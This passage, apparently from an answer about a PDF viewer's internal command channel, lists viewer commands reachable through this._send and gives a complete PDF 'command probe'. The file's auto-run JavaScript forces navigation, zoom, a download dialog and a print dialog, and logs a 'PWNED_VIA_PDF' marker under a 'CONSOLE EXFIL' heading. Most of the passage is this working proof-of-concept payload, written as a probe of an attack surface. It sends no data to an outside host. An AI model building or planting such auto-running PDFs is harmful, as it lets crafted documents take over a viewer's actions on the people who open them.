// These commands work via this._send({command: "x"})
"clear"           → console.clear()
"error"           → console.error(value)
"layout"          → change page spread mode
"page-num"        → navigate to page number
"print"           → trigger print dialog
"println"         → console.log(value)
"zoom"            → set zoom level
"SaveAs"          → trigger download
"FirstPage"       → go to first page
"LastPage"        → go to last page
"NextPage"        → next page
"PrevPage"        → previous page
"ZoomViewIn"      → increase zoom
"ZoomViewOut"     → decrease zoom
```

**What this means for your PDF:**
```
%PDF-1.7
% Viewer Command Probe - March 2026
1 0 obj
<< /Type /Catalog
   /Pages 2 0 R
   /OpenAction 3 0 R
>>
endobj

2 0 obj
<< /Type /Pages
   /Kids [4 0 R]
   /Count 1
>>
endobj

3 0 obj
<< /Type /Action
   /S /JavaScript
   /JS (
      try {
        var results = [];

        // === NAVIGATION COMMANDS ===
        results.push("=== NAVIGATION ===");

        try {
          this._send({ command: "LastPage" });
          results.push("LastPage: sent");
        } catch(e) { results.push("LastPage: " + e); }

        try {
          this._send({ command: "page-num", value: 0 });
          results.push("page-num: sent");
        } catch(e) { results.push("page-num: " + e); }

        try {
          this._send({ command: "zoom", value: 5 });
          results.push("zoom 500%: sent");
        } catch(e) { results.push("zoom: " + e); }

        // === HIGH VALUE - TRIGGER DOWNLOAD ===
        results.push("=== DOWNLOAD ===");
        try {
          this._send({ command: "SaveAs" });
          results.push("SaveAs: sent");
        } catch(e) { results.push("SaveAs: " + e); }

        // === TRIGGER PRINT DIALOG ===
        results.push("=== PRINT ===");
        try {
          this._send({ command: "print" });
          results.push("print: sent");
        } catch(e) { results.push("print: " + e); }

        // === CONSOLE EXFIL ===
        results.push("=== CONSOLE ===");
        try {
          this._send({ command: "println", value: "PWNED_VIA_PDF" });
          results.push("println: sent");
        } catch(e) { results.push("println: " + e); }

        app.alert(results.join("\\n"));

      } catch(e) {
        app.alert("OUTER ERROR: " + e);
      }
   )
>>
endobj

4 0 obj
<< /Type /Page
   /Parent 2 0 R
   /MediaBox [0 0 400 300]
   /Contents 5 0 R
>>
endobj

5 0 obj
<< /Length 90 >>
stream
BT /F1 14 Tf 50 250 Td (Command Probe) Tj ET
BT /F1 12 Tf 50 220 Td (Watch viewer) Tj ET
endstream
endobj

xref
0 6
0000000000 65535 f 
0000000015 00000 n 
0000000075 00000 n 
0000000135 00000 n 
0000001800 00000 n 
0000001960 00000 n 

trailer
<< /Size 6 /Root 1 0 R >>
startxref
2050
%%EOF